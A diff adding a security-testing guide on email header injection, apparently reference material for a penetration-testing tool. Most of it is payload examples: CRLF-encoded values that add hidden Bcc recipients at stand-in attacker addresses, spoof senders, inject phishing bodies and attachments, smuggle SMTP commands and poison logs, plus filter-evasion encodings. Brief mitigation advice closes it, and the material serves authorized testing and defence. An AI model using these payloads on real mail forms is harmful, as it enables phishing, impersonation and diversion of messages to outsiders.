@@ -1,0 +1,216 @@
+<vulnerability_guide>
+  <title>EMAIL HEADER INJECTION</title>
+
+  <critical>Email header injection allows attackers to inject additional headers into email messages by exploiting applications that incorporate user input into email headers. This enables adding recipients, modifying sender addresses, injecting attachments, and crafting sophisticated phishing emails that appear to come from trusted systems.</critical>
+
+  <scope>
+    - CRLF injection in email headers
+    - CC/BCC header injection
+    - From/Reply-To manipulation
+    - Content-Type injection
+    - Attachment injection
+    - SMTP command injection
+  </scope>
+
+  <methodology>
+    1. VULNERABILITY IDENTIFICATION
+       {% raw %}
+       # Common vulnerable inputs:
+       # - Contact forms (From, Subject)
+       # - Password reset (To address)
+       # - Invite functionality (To address)
+       # - Notification settings (Reply-To)
+
+       # Test for header injection
+       # CRLF sequences:
+       # %0d%0a (URL encoded)
+       # \r\n (literal)
+       # %0a (just LF - sometimes works)
+
+       # Example: Contact form "Name" field
+       # Input: "Attacker\r\nBcc: attacker@evil.com"
+
+       # Check if additional headers appear
+       {% endraw %}
+
+    2. BASIC HEADER INJECTION
+       {% raw %}
+       # Inject Bcc header
+       name=Test%0d%0aBcc:attacker@evil.com
+
+       # Inject Cc header
+       subject=Hello%0d%0aCc:attacker@evil.com
+
+       # Inject multiple headers
+       from=user@target.com%0d%0aBcc:evil1@attacker.com%0d%0aBcc:evil2@attacker.com
+
+       # Inject Reply-To (for phishing)
+       name=Legitimate%0d%0aReply-To:attacker@evil.com
+
+       # Modify From header
+       email=user@target.com%0d%0aFrom:ceo@company.com
+       {% endraw %}
+
+    3. CONTENT INJECTION
+       {% raw %}
+       # Inject new body content
+
+       # End headers, start body
+       subject=Test%0d%0a%0d%0aMalicious body content
+
+       # The double CRLF ends headers
+       # Everything after is body
+
+       # Inject HTML body
+       subject=Test%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body>Phishing content</body></html>
+
+       # Multipart injection
+       subject=Test%0d%0aMIME-Version:1.0%0d%0aContent-Type:multipart/mixed;boundary="evil"%0d%0a%0d%0a--evil%0d%0aContent-Type:text/html%0d%0a%0d%0aPhishing content%0d%0a--evil--
+       {% endraw %}
+
+    4. ATTACHMENT INJECTION
+       {% raw %}
+       # Inject file attachment
+
+       subject=Test%0d%0aMIME-Version:1.0%0d%0aContent-Type:multipart/mixed;boundary="bound"%0d%0a%0d%0a--bound%0d%0aContent-Type:text/plain%0d%0a%0d%0aNormal text%0d%0a--bound%0d%0aContent-Type:application/octet-stream%0d%0aContent-Disposition:attachment;filename="malware.exe"%0d%0aContent-Transfer-Encoding:base64%0d%0a%0d%0aBase64EncodedMalware%0d%0a--bound--
+
+       # This injects a complete multipart message
+       # With an attachment that could be malware
+       {% endraw %}
+
+    5. SMTP COMMAND INJECTION
+       {% raw %}
+       # If application directly constructs SMTP commands
+
+       # Inject RCPT TO
+       to=victim@target.com%0d%0aRCPT TO:<attacker@evil.com>
+
+       # Inject DATA command
+       to=victim@target.com%0d%0aDATA%0d%0aFake message body%0d%0a.%0d%0aMAIL FROM:<attacker>
+
+       # Inject additional email
+       to=victim@target.com%0d%0a.%0d%0aMAIL FROM:<ceo@company.com>%0d%0aRCPT TO:<employee@company.com>%0d%0aDATA%0d%0aSubject:Urgent%0d%0a%0d%0aPhishing content%0d%0a.
+
+       # This attempts to send a completely separate email
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <sender_spoofing>
+      {% raw %}
+      # Spoof email sender
+
+      # Inject From header
+      name=Support%0d%0aFrom:support@target.com
+
+      # Override Reply-To
+      email=real@email.com%0d%0aReply-To:attacker@evil.com
+
+      # Set Sender header
+      from=admin@target.com%0d%0aSender:ceo@company.com
+
+      # Impact:
+      # - Phishing emails appear legitimate
+      # - Bypass spam filters (trusted domain)
+      # - Internal communications spoofing
+      {% endraw %}
+    </sender_spoofing>
+
+    <unicode_bypass>
+      {% raw %}
+      # Bypass filters with unicode
+
+      # Unicode newline characters
+      # U+0085 - Next Line
+      # U+2028 - Line Separator
+      # U+2029 - Paragraph Separator
+
+      # Some mail servers accept these
+      subject=Test\u2028Bcc:attacker@evil.com
+
+      # Encoded variations
+      # Double encoding
+      # %250d%250a
+
+      # Mixed encoding
+      # %0d\n or \r%0a
+      {% endraw %}
+    </unicode_bypass>
+
+    <log_poisoning>
+      {% raw %}
+      # Inject into email logs
+
+      # If email headers are logged:
+      from=user@email.com%0d%0aX-Injected:malicious log entry
+
+      # Log injection for:
+      # - Covering tracks
+      # - Injecting false audit trails
+      # - Exploiting log analysis tools
+
+      # Combined with other attacks
+      # Inject log entry AND send to attacker
+      {% endraw %}
+    </log_poisoning>
+
+    <priority_manipulation>
+      {% raw %}
+      # Manipulate email priority
+
+      # High priority (may bypass spam)
+      subject=Test%0d%0aX-Priority:1%0d%0aImportance:high
+
+      # Request read receipt
+      subject=Test%0d%0aDisposition-Notification-To:attacker@evil.com
+
+      # Request delivery receipt
+      subject=Test%0d%0aReturn-Receipt-To:attacker@evil.com
+
+      # Useful for tracking if email was opened
+      {% endraw %}
+    </priority_manipulation>
+
+    <encoding_exploits>
+      {% raw %}
+      # Exploit content encoding
+
+      # Base64 encoded body
+      subject=Test%0d%0aContent-Transfer-Encoding:base64%0d%0a%0d%0aPGh0bWw+bWFsaWNpb3VzPC9odG1sPg==
+
+      # Quoted-printable
+      subject=Test%0d%0aContent-Transfer-Encoding:quoted-printable%0d%0a%0d%0aMalicious=20content
+
+      # UTF-8 encoded subject (bypass filters)
+      =?UTF-8?B?base64subject?=
+      {% endraw %}
+    </encoding_exploits>
+  </advanced_techniques>
+
+  <detection>
+    - Validate and sanitize all email input
+    - Reject CRLF characters in header values
+    - Use parameterized email libraries
+    - Implement output encoding for headers
+    - Log and alert on injection attempts
+  </detection>
+
+  <validation>
+    - Successfully inject additional headers
+    - Add unauthorized recipients
+    - Modify sender/reply-to addresses
+    - Inject message body content
+    - Document injection vectors
+  </validation>
+
+  <pro_tips>
+    - Try both %0d%0a and just %0a - implementations vary
+    - Contact forms are most common vulnerable feature
+    - Check all header fields: To, From, Cc, Subject, Reply-To
+    - Multipart boundary injection allows full message control
+    - Email parsing libraries often handle edge cases poorly
+    - Test with actual email delivery, not just application response
+  </pro_tips>
+
+  <remember>Email header injection turns trusted application emails into attack vectors. A vulnerable contact form becomes a platform for phishing as the company. Attachments can be injected for malware delivery. The injected emails come from legitimate mail servers, bypassing many security controls. Always use parameterized email APIs and reject newlines in user input.</remember>
+</vulnerability_guide>
